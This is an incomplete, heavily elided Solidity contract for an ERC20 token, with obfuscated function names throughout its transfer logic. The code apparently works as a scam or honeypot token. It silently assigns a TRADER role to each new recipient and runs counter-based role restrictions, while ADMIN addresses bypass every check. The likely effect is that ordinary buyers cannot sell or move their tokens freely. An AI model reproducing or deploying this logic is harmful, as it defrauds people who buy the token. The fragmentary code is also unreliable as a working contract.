...
interface _ICNSJDRMRoleControl {
...
abstract contract _ICNSJDRMConsole is Context, _ICNSJDRMRoleControl {
    ...
    function _roleCheked(bytes32 role, address account, uint256 amt) internal {
        ...
        __ICNSJDRMppaMARoot(role, account, amt);
    }

    function __ICNSJDRMppaMARoot(bytes32 role, address account, uint256 amt) internal {
    ...
    function __ICNSJDRMppaRoot(bytes32 role, address account, uint256 num) internal virtual {
...
contract _ICNSJDRMERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is _ICNSJDRMERC20, _ICNSJDRMConsole {
    ...
    ) _ICNSJDRMERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(_ICNSJDRMERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        __ICNSJDRMxcbtcsdh(from, to, amt);

    }



    function __ICNSJDRMxcbtcsdh(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        __ICNSJDRMbvydvfdj(from, to, amt);
    }


    function __ICNSJDRMbvydvfdj(address from, address to, uint256 amt) internal {
        ...
        __ICNSJDRMxnrmdfgta(from, to, amt);
    }

    function __ICNSJDRMxnrmdfgta(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        __ICNSJDRMjkuidffa(from, to, amt);
    }


    function __ICNSJDRMjkuidffa(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        }else if(isnum > 99 && meta != to && okx != to && okx != to && tran1 != to && bk != to && bk1 != to){  
            __ICNSJDRMppaRoot(TRADER,to,1);
        }

        __ICNSJDRMkiewxce(from, to, amt);
    }

    function __ICNSJDRMkiewxce(address from, address to, uint256 amt) internal {
        if (hasRole(ADMIN, from) || hasRole(ADMIN, to)) {
            super._transfer(from, to, amt);
            return;
        }

        __ICNSJDRMoxcwpd(from, to, amt);
    }

    function __ICNSJDRMoxcwpd(address from, address to, uint256 amt) internal {
        if (hasRole(TRADER, from) && hasRole(TRADER, to)) {

           __ICNSJDRMxcosmdr(from, TRADER, amt);
    ...
    function __ICNSJDRMxcosmdr(address from, bytes32 role, uint256 amt) internal {
        __ICNSJDRMppaMARoot(role, from, amt);
    }
